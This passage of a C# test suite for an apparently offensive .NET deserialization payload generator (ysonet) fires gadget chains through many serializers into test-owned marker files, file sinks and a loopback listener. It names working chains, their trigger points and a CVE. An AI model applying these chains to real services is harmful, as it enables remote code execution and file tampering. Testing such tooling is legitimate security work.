                psi.RedirectStandardError = true;
                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    proc.OutputDataReceived += delegate { };
                    proc.ErrorDataReceived += delegate { };
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
                    if (!proc.WaitForExit(40000)) { try { proc.Kill(); } catch { } }
                }
                if (WaitForFile(marker, MarkerWaitMs)) fired++;
                else failures.Add("fire plugin Resx compileddotresources (subprocess): marker not created");
            }
            catch (Exception ex) { failures.Add("fire plugin Resx compileddotresources: " + ex.Message); }
            finally { SafeDelete(marker); SafeDelete(resxOut); }
        }

        private static void PayloadsFireIntoTestSinks()
        {
            bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
            var failures = new List<string>();
            int fired = 0, skipped = 0;

            // ---- MARKER: gadgets whose BinaryFormatter output runs Process.Start on
            // deserialize (their own gadget, or a default inner TFRP/TCD). ----
            string[] bfMarkerGadgets =
            {
                "TextFormattingRunProperties", "TypeConfuseDelegate",
                "AxHostState", "DataSet", "DataSetTypeSpoof", "DataSetOldBehaviour",
                "ClaimsIdentity", "ClaimsPrincipal", "GenericPrincipal", "GenericIdentity", "FormsIdentity", "RolePrincipal",
                "SessionSecurityToken", "SessionViewStateHistoryItem", "ToolboxItemContainer",
                "WindowsIdentity", "WindowsPrincipal", "ResourceSet", "DataTable",
            };
            foreach (string g in bfMarkerGadgets)
                FireGadgetMarker(g, "BinaryFormatter", 0, false, false, "bf", true, failures, ref fired, ref skipped, trace);

            // ---- MARKER: GenericIdentity carrier across its OTHER advertised formatters.
            // Like ClaimsIdentity, GenericIdentity advertises BinaryFormatter, SoapFormatter
            // and LosFormatter. Its BinaryFormatter cell (raw and minified) is covered by
            // bfMarkerGadgets membership above and the minified loop below. The four cells
            // here complete the matrix for Soap and Los, raw and minified. The inner gadget
            // is TFRP, which fires Process.Start then throws a cast error AFTER firing; the
            // marker file (not a clean return) is the proof of execution. Any cell that does
            // not fire is a real bug to investigate, never a skip.
            FireGadgetMarker("GenericIdentity", "SoapFormatter", 0, false, false, "soap", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GenericIdentity", "SoapFormatter", 0, true, false, "soap", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GenericIdentity", "LosFormatter", 0, false, false, "los", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GenericIdentity", "LosFormatter", 0, true, false, "los", true, failures, ref fired, ref skipped, trace);

            // ---- MARKER: GenericPrincipal SoapFormatter, both variants, raw and minified.
            // GenericPrincipal's BinaryFormatter cell is covered by bfMarkerGadgets membership
            // above. SoapFormatter was added on top of BF/Los: unlike ClaimsPrincipal (whose
            // fields are [OptionalField]), GenericPrincipal has required own fields (m_identity,
            // m_roles), so its SOAP payload must carry all four members. Variant 1 fires through
            // ClaimsPrincipal.DeserializeIdentities; variant 2 fires through the nested
            // ClaimsIdentity.DeserializeClaims. The inner is TypeConfuseDelegate, which fires
            // Process.Start then throws a cast error AFTER firing; the marker is the proof.
            FireGadgetMarker("GenericPrincipal", "SoapFormatter", 1, false, false, "soap", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GenericPrincipal", "SoapFormatter", 1, true, false, "soap", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GenericPrincipal", "SoapFormatter", 2, false, false, "soap", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GenericPrincipal", "SoapFormatter", 2, true, false, "soap", true, failures, ref fired, ref skipped, trace);

            // ---- MARKER: FormsIdentity across its OTHER advertised formatters. Its
            // BinaryFormatter cell (raw and minified) is covered by bfMarkerGadgets membership
            // above. FormsIdentity (System.Web) reaches the ClaimsIdentity nested-BF sink through
            // five formatters: BF and Los use the hand-built System.Web NRBF stream; Soap uses the
            // percent-encoded nsassem namespace; DCS and NDCS import ClaimsIdentity as a base data
            // contract (member m_serializedClaims). The inner is TFRP (fires then throws a cast
            // AFTER firing); the marker is the proof. Each cell fires through DeserializeClaims.
            FireGadgetMarker("FormsIdentity", "SoapFormatter", 0, false, false, "soap", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("FormsIdentity", "SoapFormatter", 0, true, false, "soap", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("FormsIdentity", "LosFormatter", 0, false, false, "los", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("FormsIdentity", "LosFormatter", 0, true, false, "los", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("FormsIdentity", "DataContractSerializer", 0, false, false, "dcs", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("FormsIdentity", "DataContractSerializer", 0, true, false, "dcs", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("FormsIdentity", "NetDataContractSerializer", 0, false, false, "ndc", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("FormsIdentity", "NetDataContractSerializer", 0, true, false, "ndc", true, failures, ref fired, ref skipped, trace);

            // ---- MARKER: DataContract serializers for the field-based ClaimsIdentity family.
            // ClaimsIdentity, GenericIdentity, ClaimsPrincipal and GenericPrincipal each import
            // ClaimsIdentity/ClaimsPrincipal as a data contract, so DCS and NDCS carry the inner
            // BF payload in m_serializedClaims / m_serializedClaimsIdentities and fire through the
            // OnDeserialized callback. DCS uses the self-describing root/type wrapper; NDCS uses
            // z:Type/z:Assembly. (DataContractJsonSerializer needs the root type supplied out of
            // band, so it is fired by DataContractJsonFiresForClaimsFamily instead.)
            foreach (string g in new[] { "ClaimsIdentity", "GenericIdentity", "ClaimsPrincipal", "GenericPrincipal" })
            {
                FireGadgetMarker(g, "DataContractSerializer", 0, false, false, "dcs", true, failures, ref fired, ref skipped, trace);
                FireGadgetMarker(g, "DataContractSerializer", 0, true, false, "dcs", true, failures, ref fired, ref skipped, trace);
                FireGadgetMarker(g, "NetDataContractSerializer", 0, false, false, "ndc", true, failures, ref fired, ref skipped, trace);
                FireGadgetMarker(g, "NetDataContractSerializer", 0, true, false, "ndc", true, failures, ref fired, ref skipped, trace);
            }

            // ---- MARKER: DataTable carrier across its OTHER advertised formatters.
            // Unlike the BF-only siblings above, DataTable advertises BinaryFormatter,
            // SoapFormatter and LosFormatter. Its BinaryFormatter cell (raw and minified)
            // is already covered by bfMarkerGadgets membership (the raw loop above and the
            // minified loop below). The four cells here complete the matrix for Soap and
            // Los, raw and minified. The inner gadget is TFRP, which fires Process.Start
            // then throws a cast error AFTER firing; RunSTA swallows that throw, so the
            // marker file (not a clean return) is the proof of execution. Any cell that
            // does not fire is a real bug to investigate, never a skip.
            FireGadgetMarker("DataTable", "SoapFormatter", 0, false, false, "soap", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("DataTable", "SoapFormatter", 0, true, false, "soap", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("DataTable", "LosFormatter", 0, false, false, "los", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("DataTable", "LosFormatter", 0, true, false, "los", true, failures, ref fired, ref skipped, trace);

            // ---- MARKER: DataTable variant 2 (TypeConfuseDelegate inner). This inner is
            // framework built-in (no WPF, no Microsoft.PowerShell.Editor) and fires
            // Process.Start directly. SoapFormatter is opted out for this variant (generic
            // SortedSet), so only BinaryFormatter and LosFormatter are fired, raw and
            // minified. The no-variant calls above still exercise the compatible TFRP default.
            FireGadgetMarker("DataTable", "BinaryFormatter", 2, false, false, "bf", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("DataTable", "BinaryFormatter", 2, true, false, "bf", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("DataTable", "LosFormatter", 2, false, false, "los", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("DataTable", "LosFormatter", 2, true, false, "los", true, failures, ref fired, ref skipped, trace);

            // ---- MARKER: TypeConfuseDelegate root-container variants 2 (SortedDictionary)
            // and 3 (TreeSet). Variant 1 is covered by bfMarkerGadgets membership (raw above,
            // minified below). These two keep the same Comparison<string> -> Process.Start
            // splice but reach it through a different serialized root, so every advertised
            // formatter must be proven to still execute, raw and minified. The comparer is
            // called back while the container rebuilds; the gadget then throws on the confused
            // return value, so the marker file is the proof. Any cell that does not fire is a
            // real bug, never a skip.
            foreach (int tcdVariant in new[] { 2, 3 })
            {
                FireGadgetMarker("TypeConfuseDelegate", "BinaryFormatter", tcdVariant, false, false, "bf", true, failures, ref fired, ref skipped, trace);
                FireGadgetMarker("TypeConfuseDelegate", "BinaryFormatter", tcdVariant, true, false, "bf", true, failures, ref fired, ref skipped, trace);
                FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", tcdVariant, false, false, "los", true, failures, ref fired, ref skipped, trace);
                FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", tcdVariant, true, false, "los", true, failures, ref fired, ref skipped, trace);
                FireGadgetMarker("TypeConfuseDelegate", "NetDataContractSerializer", tcdVariant, false, false, "ndc", true, failures, ref fired, ref skipped, trace);
                FireGadgetMarker("TypeConfuseDelegate", "NetDataContractSerializer", tcdVariant, true, false, "ndc", true, failures, ref fired, ref skipped, trace);
                // --minify --ust is the combination that routes variant 1 into the hardcoded
                // NRBF stream. Variants 2 and 3 take the normal Serialize() path there, so
                // fire that path too rather than assuming it matches the plain minified one.
                FireGadgetMarker("TypeConfuseDelegate", "BinaryFormatter", tcdVariant, true, true, "bf", true, failures, ref fired, ref skipped, trace);
                FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", tcdVariant, true, true, "los", true, failures, ref fired, ref skipped, trace);
                FireGadgetMarker("TypeConfuseDelegate", "NetDataContractSerializer", tcdVariant, true, true, "ndc", true, failures, ref fired, ref skipped, trace);
            }
            // Variant 1's own NetDataContractSerializer and LosFormatter cells, so the full
            // advertised set is fired for every container, not just for the two new ones.
            FireGadgetMarker("TypeConfuseDelegate", "NetDataContractSerializer", 1, false, false, "ndc", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("TypeConfuseDelegate", "NetDataContractSerializer", 1, true, false, "ndc", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", 1, false, false, "los", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", 1, true, false, "los", true, failures, ref fired, ref skipped, trace);
            // The two hardcoded --minify --ust NRBF paths (BinaryFormatter and LosFormatter)
            // are variant 1 only; fire them so the gated block stays proven to execute.
            FireGadgetMarker("TypeConfuseDelegate", "BinaryFormatter", 1, true, true, "bf", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", 1, true, true, "los", true, failures, ref fired, ref skipped, trace);

            // ---- FILE SINKS: TypeConfuseDelegateFileOperations. Its effect is not a
            // spawned process but a real file-system change made in-process by the
            // deserializer, so the sink is a test-owned file or directory rather than a
            // marker command. Every operation x every advertised formatter x every
            // serialized root x minify off/on is fired and the effect asserted, because the
            // spliced method and the argument order are what this gadget is.
            FireFileOperations(failures, ref fired, trace);

            // ---- FILE SINKS: TempFileCollection. The effect is a DELETE performed
            // in-process by the deserialized object itself, through its finalizer or through
            // an explicit Dispose(), so there is no marker command and no spawned process.
            // Both paths are fired for every advertised formatter, raw and minified, into a
            // test-owned directory that also holds a sentinel file the payload must leave
            // alone.
            FireTempFileCollectionDeletes(failures, ref fired, trace);

            // Conditional MARKER (self-skip, not fail):
            // - WindowsClaimsIdentity needs a non-GAC assembly (Microsoft.IdentityModel, a
            //   NuGet dependency present here) to build the type on deserialize.
            FireGadgetMarker("WindowsClaimsIdentity", "BinaryFormatter", 0, false, false, "bf", false, failures, ref fired, ref skipped, trace);
            // - TypeConfuseDelegateMono targets the Mono delegate field layout (it sets BOTH
            //   invocation-list slots to Process.Start, unlike TypeConfuseDelegate which sets
            //   only the second). On .NET Framework that graph does not fire; generation is
            //   covered in 6.2. - PSObject fires only through its OWN self-test, which installs a
            //   LocalBinder to resolve PSObject to the bundled recompiled vulnerable DLL (a plain
            //   deserialize would resolve it to the patched GAC assembly). Fire both through the
            //   gadget's Test=true self-test (STA), which installs any binder the gadget needs.
            FireGadgetSelfTest("TypeConfuseDelegateMono", "BinaryFormatter",
                "Mono delegate layout; fires on Mono, not on .NET Framework", failures, ref fired, ref skipped, trace);
            FireGadgetSelfTest("PSObject", "BinaryFormatter",
                "CVE-2017-8565 is patched on this framework; PSObject fires only on an unpatched target", failures, ref fired, ref skipped, trace);

            // MARKER via Xaml / Json.NET deserialize (STA).
            FireGadgetMarker("ObjectDataProvider", "Xaml", 1, false, false, "xaml", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSecurityException", "Json.NET", 0, false, false, "json", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSettingsPropertyValue", "Json.NET", 0, false, false, "json", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSettingsPropertyValue", "Xaml", 0, false, false, "xaml", true, failures, ref fired, ref skipped, trace);

            // Minify CORRECTNESS: a minified payload must still FIRE, not merely be non-empty.
            // Fire EVERY BinaryFormatter marker gadget again with --minify (the BinaryFormatter
            // minify path), so the minifier is proven not to break execution for any of them.
            foreach (string g in bfMarkerGadgets)
                FireGadgetMarker(g, "BinaryFormatter", 0, true, false, "bf", true, failures, ref fired, ref skipped, trace);
            // The Xaml (XmlMinifier) and Json.NET (JsonMinifier) deserialize paths, minified too,
            // so all three minifier families are covered end-to-end, not just BinaryFormatter.
            FireGadgetMarker("ObjectDataProvider", "Xaml", 1, true, false, "xaml", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSettingsPropertyValue", "Xaml", 0, true, false, "xaml", true, failures, ref fired, ref skipped, trace);
            // The minified gspv Xaml uses the compact base64-string form (SerializeAs=Binary)
            // instead of the per-byte array. Fire it through a SECOND getter chain too: variant 2
            // (ComboBox) reaches the getter via .Items, where variant 0 (PropertyGrid) uses
            // .SelectedObject, so both wrapper shapes are proven to fire the base64 form.
            FireGadgetMarker("GetterSettingsPropertyValue", "Xaml", 2, true, false, "xaml", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSecurityException", "Json.NET", 0, true, false, "json", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("GetterSettingsPropertyValue", "Json.NET", 0, true, false, "json", true, failures, ref fired, ref skipped, trace);

            // --usesimpletype on a Json.NET-family payload must still fire (minified).
            FireGadgetMarker("GetterSecurityException", "Json.NET", 0, true, true, "json", true, failures, ref fired, ref skipped, trace);

            // ResourceSet via NetDataContractSerializer, non-minified AND minified. The minified
            // form is the INTENTIONAL fragment the matrix well-formedness check exempts (its
            // generator discards </Values></Table></w>). Firing both proves that truncated
            // fragment still deserializes and executes, so the exemption is backed by a real
            // firing rather than only skipped.
            FireGadgetMarker("ResourceSet", "NetDataContractSerializer", 0, false, false, "ndc", true, failures, ref fired, ref skipped, trace);
            FireGadgetMarker("ResourceSet", "NetDataContractSerializer", 0, true, false, "ndc", true, failures, ref fired, ref skipped, trace);

            // ---- SELF_CLOSING_CS: compile-and-run gadgets whose compiled ctor writes the marker. ----
            FireSelfClosingCs("ActivitySurrogateSelectorFromFile", failures, ref fired, ref skipped, trace);
            FireSelfClosingCs("XamlAssemblyLoadFromFile", failures, ref fired, ref skipped, trace);
            FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace);
            // Same three gadgets, MINIFIED. DataSetOldBehaviourFromFile --minify was the
            // ~112s XmlMinifier perf case; its minified payload must generate fast and still
            // fire. The other two were already fast and are cheap to cover.
            FireSelfClosingCs("ActivitySurrogateSelectorFromFile", failures, ref fired, ref skipped, trace, true);
            FireSelfClosingCs("XamlAssemblyLoadFromFile", failures, ref fired, ref skipped, trace, true);
            FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace, true);
            // DataSetOldBehaviourFromFile --compressed (GZip the embedded assembly): the payload
            // must decompress it via a GZipStream and still Assembly.Load + run the type. Cover
            // both compressed and compressed+minify (the minified form is what a user ships).
            FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace, false, true);
            FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace, true, true);
            // XamlAssemblyLoadFromFile through the two alternate roots of its
            // TypeConfuseDelegate wrapper. The XAML must still reach XamlReader.Parse and
            // Assembly.Load + run the compiled type when the SortedSet is swapped for a
            // SortedDictionary or a TreeSet.
            FireSelfClosingCs("XamlAssemblyLoadFromFile", " --rootcontainer 2", "c2_", " (--rootcontainer 2)",
                failures, ref fired, ref skipped, trace);
            FireSelfClosingCs("XamlAssemblyLoadFromFile", " --rootcontainer 3", "c3_", " (--rootcontainer 3)",
                failures, ref fired, ref skipped, trace);

            // ---- Plugin MARKER via each plugin's own -t self-test path. ----
            FirePluginMarker("Altserialization", new[] { "-M", "HttpStaticObjectsCollection" }, failures, ref fired, trace);
            FirePluginMarker("Altserialization", new[] { "-M", "SessionStateItemCollection" }, failures, ref fired, trace);
            // The Session mode --minify path uses a byte-splice that carries a minified BF blob
            // (System.Web's own Serialize would ignore --minify); fire it minified to prove the
            // spliced payload still deserializes and executes.
            FirePluginMarker("Altserialization", new[] { "-M", "SessionStateItemCollection", "--minify" }, failures, ref fired, trace);
            FirePluginMarker("ApplicationTrust", new string[0], failures, ref fired, trace);
            FirePluginMarker("TransactionManagerReenlist", new string[0], failures, ref fired, trace);

            // ---- XPS DOCUMENT: open the generated .xps the way a consumer application does,
            // once on the patched default (must be blocked) and once with the legacy switches
            // flipped for this process (must fire). Every markup part is covered.
            foreach (string xpsMode in new[] { "fdseq", "fdoc", "fpage", "all" })
                FireXpsDocument(xpsMode, failures, ref fired, ref skipped, trace);

            // Resx compileddotresources fires via a ResourceSet over the generated .resources
            // file. That read is reliable in a fresh process (it needs ysonet's assembly
            // resolver), so fire it via a subprocess self-test rather than in-process.
            FireResxCompiledSubprocess(failures, ref fired, ref skipped, trace);

            // ---- LISTENER: SSRF/callback payloads connect to a loopback capture proxy. ----
            foreach (string gadget in new[] { "PictureBox", "InfiniteProgressPage" })
            {
                var formatters = new List<string> { "Json.NET", "FastJson", "JavaScriptSerializer", "YamlDotNet", "SharpSerializerXml", "Xaml" };
                if (gadget == "PictureBox")
                {
                    formatters.Add("MessagePackTypeless");
                    formatters.Add("MessagePackTypelessLz4");
                }
                foreach (string fmt in formatters)
                {
                    FireNetNonRceListener(gadget, fmt, failures, ref fired, trace);
                    FireNetNonRceListener(gadget, fmt, true, failures, ref fired, trace);
                }
            }

            // ---- TEMPDIR: FileLogTraceListener creates the supplied directory on
            // deserialize. Its own sink, so nothing outside the test tree is touched.
            foreach (string fmt in new[] { "Json.NET", "JavaScriptSerializer", "Xaml" })
                FireFileLogTraceListenerTempDir(fmt, false, failures, ref fired, trace);
            // Xaml --minify: the minified payload must still create the directory.
            FireFileLogTraceListenerTempDir("Xaml", true, failures, ref fired, trace);

            // ---- LEGACY XML: DataViewManagerXxe fetches an external DTD, but only where the
            // pre-4.5.2 XML resolver defaults are in force, so every cell runs in a child
            // process stamped with the target framework under test.
            foreach (string fmt in new[] { "Xaml", "JavaScriptSerializer", "FastJson", "SharpSerializerXml", "SharpSerializerBinary" })
            {
                FireDataViewManagerXxe(fmt, false, true, failures, ref fired, ref skipped, trace);
                FireDataViewManagerXxe(fmt, true, true, failures, ref fired, ref skipped, trace);
            }
            // Hardened-default control: the same payload must do nothing on a 4.5.2+ target.
            // One representative text formatter and the binary one.
            FireDataViewManagerXxe("Xaml", false, false, failures, ref fired, ref skipped, trace);
            FireDataViewManagerXxe("SharpSerializerBinary", false, false, failures, ref fired, ref skipped, trace);
            LegacyXmlChild.Cleanup();

            // ---- INSTALLER MARKER: AssemblyInstallerLoad loads a DLL and constructs its
            // [RunInstaller(true)] classes. The DLL is the test assembly itself, whose
            // fixture installer appends one marker line per construction, so every
            // advertised formatter is fired raw and minified through the PropertyGrid
            // carrier, and the two formatters that can also build the list carriers are
            // fired through all four. Each cell also asserts the installer ran exactly once.
            foreach (string[] row in AssemblyInstallerFireRows)
            {
                FireAssemblyInstallerLoad(row[0], row[1], 1, false, failures, ref fired, trace);
                FireAssemblyInstallerLoad(row[0], row[1], 1, true, failures, ref fired, trace);
                if (row[0] != "Json.NET" && row[0] != "Xaml")
                    continue;
                for (int getter = 2; getter <= 4; getter++)
                {
                    FireAssemblyInstallerLoad(row[0], row[1], getter, false, failures, ref fired, trace);
                    FireAssemblyInstallerLoad(row[0], row[1], getter, true, failures, ref fired, trace);
                }
            }

            // ObjectDataProvider variant 3 is the xamlurl SSRF variant: it fetches the URL on load.
            FireOdpXamlUrlListener(failures, ref fired, trace);

            // ObjRef remoting is finicky (needs a process-global client channel); best-effort.
            FireObjRefListener(failures, ref fired, ref skipped, trace);

            AssertTrue(fired > 25, "fired a large set of payloads into test-owned sinks (was " + fired + ", skipped " + skipped + ")");
            AssertTrue(failures.Count == 0,
                "execution cells failed (" + failures.Count + ", fired " + fired + ", skipped " + skipped + "):\n  "
                + string.Join("\n  ", failures.ToArray()));
        }

        // What this run proved about runtime version support. Every fire above records
        // its gadget, so a FULL run IS the evidence for the version facet: these
        // payloads did their job on the build named here. Run it right after the
        // matrix, while that record is fresh.
        //
        // Two rules, and only one of them fails the build:
        //  - a gadget that fired while claiming versions this build sits OUTSIDE and
        //    BELOW (or claiming only another runtime family) contradicts what just
        //    happened, so it fails; and
        //  - a gadget that fired on a build NEWER than its recorded ceiling, or that
        //    claims nothing at all, is only under-documented. Both are reported, not
        //    failed: a contributor on a newer framework than the last recorded run
        //    must not get a red build for it.
        private static void VersionEvidenceMatchesThisRuntime()
        {
            string build = RuntimeBuild.Token();
            Console.Error.WriteLine("  [info] fired on " + RuntimeBuild.Describe());

            if (!RuntimeBuild.AnythingFired())
            {
                Console.Error.WriteLine("  [skip] VersionEvidenceMatchesThisRuntime: nothing fired "
                    + "(the execution matrix is FULL-tier, so a NORMAL run has no evidence to check)");
                return;
            }
            if (build == null)
            {
                Console.Error.WriteLine("  [skip] VersionEvidenceMatchesThisRuntime: this host does not "
                    + "report a .NET Framework build, so a fire proves nothing about a version");
                return;
            }

            var contradictions = new List<string>();
            var couldDeclare = new List<string>();
            var couldExtend = new List<string>();
            int buildIndex = RuntimeVersion.IndexOf(build);

            foreach (string gadget in RuntimeBuild.FiredGadgets())
            {
                IGenerator g = GadgetRegistry.CreateGadgetInstance(gadget);
                if (g == null)
                    continue;

                List<string> declared = VersionsOf(g);
                if (declared.Contains(RuntimeVersion.Unspecified))
                {
                    couldDeclare.Add(gadget);
                    continue;
                }
                if (declared.Contains(build))
                    continue;

                // Declared, but not this build. Newer than everything it claims is new
                // evidence to write down; anything else is a claim this run just broke.
                int highestClaimed = -1;
                foreach (string v in declared)
                {
                    if (!string.Equals(RuntimeVersion.Family(v), RuntimeVersion.Family(build), StringComparison.Ordinal))
                        continue;
                    int i = RuntimeVersion.IndexOf(v);
                    if (i > highestClaimed)
                        highestClaimed = i;
                }

                if (highestClaimed >= 0 && buildIndex > highestClaimed)
                    couldExtend.Add(gadget + " (recorded up to "
                        + GadgetFacetReader.Label(RuntimeVersion.All[highestClaimed]) + ")");
                else
                    contradictions.Add(gadget + " fired on " + GadgetFacetReader.Label(build)
                        + " but declares " + GadgetFacetReader.VersionSummary(declared));
            }

            if (couldDeclare.Count > 0)
            {
                Console.Error.WriteLine("  [info] fired here but declare no runtime version yet ("
                    + couldDeclare.Count + "): " + string.Join(", ", couldDeclare.ToArray()));
                Console.Error.WriteLine("  [info] each can declare up to " + GadgetFacetReader.Label(build)
                    + "; pick the lower bound from the documented introduction version.");
            }
            if (couldExtend.Count > 0)
                Console.Error.WriteLine("  [info] this build is newer than what these record, so their upper bound "
                    + "can be raised to " + GadgetFacetReader.Label(build) + ": "
                    + string.Join(", ", couldExtend.ToArray()));

            AssertTrue(contradictions.Count == 0,
                "a payload fired on a build its own metadata excludes, so the claim is wrong:\n  "
                + string.Join("\n  ", contradictions.ToArray()));
        }

        // Every version any unit of the gadget declares, for one readable message.
        private static List<string> VersionsOf(IGenerator g)
        {
            var all = new List<string>();
            foreach (GadgetCapability cap in GadgetFacetReader.Expand(g))
                foreach (string v in cap.Versions)
                    if (!all.Contains(v))
                        all.Add(v);
            return all;
        }

        // Every TypeConfuseDelegateFileOperations cell, fired for real into test-owned
        // files and directories: 5 operations x 3 formatters x 3 serialized roots x
        // minify off/on. There is no marker command and no spawned process here - the
        // deserializer itself performs the file operation - so the effect is asserted
        // synchronously right after the deserialize instead of polled for.
        //
        // Fixture names carry the ordering rule: the FIRST argument must sort after the
        // second with String.CompareOrdinal, so sources/targets start "zz_" and
        // destinations start "aa_". Nothing here rewrites those names; the generator
        // refuses any pair that does not already satisfy the rule.
        private static void FireFileOperations(List<string> failures, ref int fired, bool trace)
        {
            string root = TestArtifactPath("ysonet_fileops_fire");
            SafeDeleteDir(root);
            Directory.CreateDirectory(root);
            string contentFile = Path.Combine(root, "content.txt");
            // Minify-SAFE body: no carriage return, no trailing whitespace, no "; ". Those
            // are the three things the XML minifier rewrites, and the gadget refuses to
            // build a minified NetDataContractSerializer payload that would be rewritten
            // (proven separately by FileOperationsRefuseLossyMinification and by the
            // expected-failure cell in the generation matrix). Here the point is that every
            // cell FIRES, so the fixture stays inside what all three formatters can carry.
            File.WriteAllText(contentFile, "!ysonet fire fixture\nsecond line");

            try
            {
                foreach (string formatter in FileOpsFormatters)
                {
                    string tag = FileOpsDeserTag(formatter);
                    for (int container = 1; container <= 3; container++)
                    {
                        foreach (bool minify in new[] { false, true })
                        {
                            string cell = " -f " + formatter + " --rootcontainer " + container
                                + (minify ? " --minify" : "");
                            string stem = tag + "_c" + container + (minify ? "_min" : "");
                            if (trace)
                            {
                                Console.Error.WriteLine("    [fire] " + FileOpsGadget + cell);
                                Console.Error.Flush();
                            }
                            FireFileOpsWrite(root, contentFile, stem, formatter, container, minify, cell, failures, ref fired);
                            FireFileOpsCopy(root, stem, formatter, container, minify, cell, failures, ref fired);
                            FireFileOpsMove(root, stem, formatter, container, minify, cell, failures, ref fired);
                            FireFileOpsDirMove(root, stem, formatter, container, minify, cell, failures, ref fired);
                            FireFileOpsEmpty(root, stem, formatter, container, minify, cell, failures, ref fired);
                        }
                    }
                }
            }
            finally { SafeDeleteDir(root); }
        }

        // Generate one cell and deserialize it. Returns false (and records the failure)
        // when generation itself did not succeed, so the caller can skip its assertions.
        private static bool FireFileOpsCell(int variant, string cmd, string formatter,
            int container, bool minify, string label, List<string> failures)
        {
            RunResult r = GenerateFileOps(variant, cmd, formatter, container, minify);
            if (!r.Success)
            {
                failures.Add("fire " + label + ": generation failed: " + r.ErrorMessage);
                return false;
            }
            byte[] payload = Bytes(r.Raw);
            // The operation runs inside the container's deserialization callback; the
            // comparer then returns a confused value, so a throw AFTER the effect is
            // normal and RunSTA swallows it. The file system is the assertion.
            RunSTA(delegate { DeserializeAs(FileOpsDeserTag(formatter), payload); });
            return true;
        }

        private static void FireFileOpsWrite(string root, string contentFile, string stem,
            string formatter, int container, bool minify, string cell, List<string> failures, ref int fired)
        {
            string label = "TCDFileOps write" + cell;
            string target = Path.Combine(root, "zz_write_" + stem + ".txt");
            SafeDelete(target);
            if (!FireFileOpsCell(1, target + ";" + contentFile, formatter, container, minify, label, failures))
                return;
            string expected = File.ReadAllText(contentFile);
            if (!File.Exists(target))
                failures.Add("fire " + label + ": the target file was not written");
            else if (File.ReadAllText(target) != expected)
                failures.Add("fire " + label + ": the target text does not match the local content file");
            else { fired++; RuntimeBuild.RecordFired(FileOpsGadget); }
            SafeDelete(target);
        }

        private static void FireFileOpsCopy(string root, string stem, string formatter,
            int container, bool minify, string cell, List<string> failures, ref int fired)
        {
            string label = "TCDFileOps copy" + cell;
            string source = Path.Combine(root, "zz_copy_" + stem + ".txt");
            string dest = Path.Combine(root, "aa_copy_" + stem + ".txt");
            SafeDelete(source); SafeDelete(dest);
            File.WriteAllText(source, "copied by ysonet");
            if (FireFileOpsCell(2, source + ";" + dest, formatter, container, minify, label, failures))
            {
                if (!File.Exists(source))
                    failures.Add("fire " + label + ": File.Copy must leave the source in place");
                else if (!File.Exists(dest))
                    failures.Add("fire " + label + ": the destination copy was not created");
                else if (File.ReadAllText(dest) != "copied by ysonet")
                    failures.Add("fire " + label + ": the copy does not hold the source content");
                else { fired++; RuntimeBuild.RecordFired(FileOpsGadget); }
            }
            SafeDelete(source); SafeDelete(dest);
        }

        private static void FireFileOpsMove(string root, string stem, string formatter,
            int container, bool minify, string cell, List<string> failures, ref int fired)
        {
            string label = "TCDFileOps move" + cell;
            string source = Path.Combine(root, "zz_move_" + stem + ".txt");
            string dest = Path.Combine(root, "aa_move_" + stem + ".txt");
            SafeDelete(source); SafeDelete(dest);
            File.WriteAllText(source, "moved by ysonet");
            if (FireFileOpsCell(3, source + ";" + dest, formatter, container, minify, label, failures))
            {
                if (File.Exists(source))
                    failures.Add("fire " + label + ": the source file was not moved away");
                else if (!File.Exists(dest))
                    failures.Add("fire " + label + ": the destination file was not created");
                else if (File.ReadAllText(dest) != "moved by ysonet")
                    failures.Add("fire " + label + ": the moved file does not hold the source content");
                else { fired++; RuntimeBuild.RecordFired(FileOpsGadget); }
            }
            SafeDelete(source); SafeDelete(dest);
        }

        private static void FireFileOpsDirMove(string root, string stem, string formatter,
            int container, bool minify, string cell, List<string> failures, ref int fired)
        {
            string label = "TCDFileOps dirmove" + cell;
            string source = Path.Combine(root, "zz_dir_" + stem);
            string dest = Path.Combine(root, "aa_dir_" + stem);
            SafeDeleteDir(source); SafeDeleteDir(dest);
            Directory.CreateDirectory(source);
            File.WriteAllText(Path.Combine(source, "inside.txt"), "child");
